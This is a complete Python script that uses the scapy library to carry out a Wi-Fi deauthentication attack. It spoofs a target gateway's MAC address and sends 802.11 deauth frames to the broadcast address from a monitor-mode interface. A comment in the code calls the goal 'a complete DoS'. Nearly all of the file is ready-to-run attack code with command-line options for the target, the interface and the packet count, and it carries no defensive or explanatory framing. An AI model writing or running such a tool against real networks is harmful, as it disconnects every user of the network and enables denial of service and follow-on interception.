from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, sendp
import argparse
from datetime import datetime

broadcast_mac = "FF:FF:FF:FF:FF:FF" # For a complete DoS

def deauth(gateway_mac, interface, count):
    dot11 = Dot11(addr1=broadcast_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    sendp(packet, inter=0.1, count=count, iface=interface, verbose=1)

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Target gateway")
    parser.add_argument("-i", "--interface", help="Network interface in monitor mode")
    parser.add_argument("-c", "--count", help="Amount of packets to send. 100 packets = 10 seconds deauth")

    args = parser.parse_args()

    gateway_mac = args.target
    interface = args.interface
    count = int(args.count)

    deauth(gateway_mac, interface, count)
